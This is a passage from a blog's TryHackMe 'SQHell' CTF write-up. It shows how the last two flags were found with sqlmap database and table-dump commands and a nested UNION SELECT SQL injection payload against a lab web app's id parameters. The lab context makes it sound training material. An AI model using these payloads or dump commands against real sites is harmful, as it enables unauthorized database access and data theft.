<p>Now, let’s return to the <code class="language-plaintext highlighter-rouge">user page</code>. You can see the URL <code class="language-plaintext highlighter-rouge">endpoint is /user?id=1</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/user.png" alt="user"></p>

<p>So, I try <code class="language-plaintext highlighter-rouge">id=2-1</code> for the <code class="language-plaintext highlighter-rouge">vulnerability detection</code>. And it’s <code class="language-plaintext highlighter-rouge">working</code>.</p>

<p><img src="/assets/img/tryhackme/sqhell/detect.png" alt="detect"></p>

<p>So, let’s <code class="language-plaintext highlighter-rouge">capture the request</code> and <code class="language-plaintext highlighter-rouge">scan it using sqlmap</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test5.req --dbs   
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/sqhell-4.png" alt="sqhell-4"></p>

<p>We found the <code class="language-plaintext highlighter-rouge">sqhell_4 table</code> but the flag is <code class="language-plaintext highlighter-rouge">not in there</code>. Let’s try the <code class="language-plaintext highlighter-rouge">UNION payload</code> on the website.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> /user?id=-1 UNION ALL SELECT "1 UNION SELECT 1,flag,3,4 FROM flag-- -", 1,2 FROM users#
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-4.png" alt="flag-4"></p>

<p><code class="language-plaintext highlighter-rouge">Success!</code> We found <code class="language-plaintext highlighter-rouge">Flag-4</code>.</p>

<p><br></p>

<h3 id="flag-5">Flag 5</h3>

<p>Now, only the <code class="language-plaintext highlighter-rouge">post page</code> that we didn’t look at.</p>

<p><img src="/assets/img/tryhackme/sqhell/post.png" alt="post"></p>

<p>As we see the <code class="language-plaintext highlighter-rouge">endpoint is /post?id=1</code>.</p>

<p>Now, let’s capture the request and <code class="language-plaintext highlighter-rouge">scan with sqlmap</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r one.req -D sqhell_5 -T flag --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/sqhell/flag-5.png" alt="flag-5"></p>

<p>This one is easy. We found the <code class="language-plaintext highlighter-rouge">last flag</code>.</p>

<p><br></p>

<p><code class="language-plaintext highlighter-rouge">Congratulations!</code> We have successfully completed the steps to find all the flags. It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care <img class="emoji" title=":wave:" alt=":wave:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f44b.png" height="20" width="20"></p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Jul 06, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">web, mysql, sqli</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>
<!-- Twitter Share Button -->
<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20SQHell&url=http://localhost:4000/tryhackme-sqhell/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
    Tweet
</a>
  
<!-- LinkedIn Share Button -->
<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-sqhell/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
    LinkedIn
</a>
  
  

<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-sqhell/';
    this.page.identifier = '/tryhackme-sqhell';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
    </div>




    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
    <footer>
  <div class="footer">
    © Copyright 2025 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
  </div>
</footer>

    <!-- script -->
    <script src="/assets/js/nav.js"></script>
    <script src="/assets/js/clip.js"></script>
    <script src="/assets/js/scroll-top.js"></script>
    <script src="/assets/js/search.js"></script>
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "TryHackMe - SQHell",
    "author": {
      "@type": "Person",
      "name": ""
    },
    "datePublished": "2023-07-06 00:00:00 +0300",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http://localhost:4000/tryhackme-sqhell/"
    },
    "articleSection": "TryHackMe"
  }
</script>
  </body>
</html>
